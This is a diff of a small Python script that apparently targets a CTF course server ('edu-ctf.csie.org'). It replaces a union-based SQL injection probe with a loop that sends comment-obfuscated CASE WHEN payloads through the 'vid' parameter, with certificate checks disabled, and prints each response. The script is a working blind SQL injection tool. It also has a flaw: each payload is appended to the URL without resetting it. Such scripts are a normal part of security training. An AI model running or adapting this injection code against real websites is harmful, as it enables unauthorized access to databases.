@@ -1,17 +1,20 @@
 import requests
-url = 'https://edu-ctf.csie.org:10159/video.php?vid=-1'
-payload = '/**/union/**/1==1'
+import urllib3
 
-url += payload
-str1 = 1
-str2 = 2
-payload = str1 + str2
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-result = requests.get(url, verify=False)
+url = 'https://edu-ctf.csie.org:10159/video.php?vid='
 
-print(result.text)
+for i in range(0, 255):
+    print('---------------lognumber %d ----------'%(i))
+
+    payload = '(case/**/when/**/(' + str(chr(i)) +')/**/then/**/1/**/else/**/2/**/end)'
+    url += payload
+    result = requests.get(url, verify=False)
+
+    #if 'Error' not in result.text and 'Bad cat!' not in result.text:
+    print(result.text)
 #print('--------------')
 #print(result.headers)
 
-for i in range(0, 2):
-    print('')
+
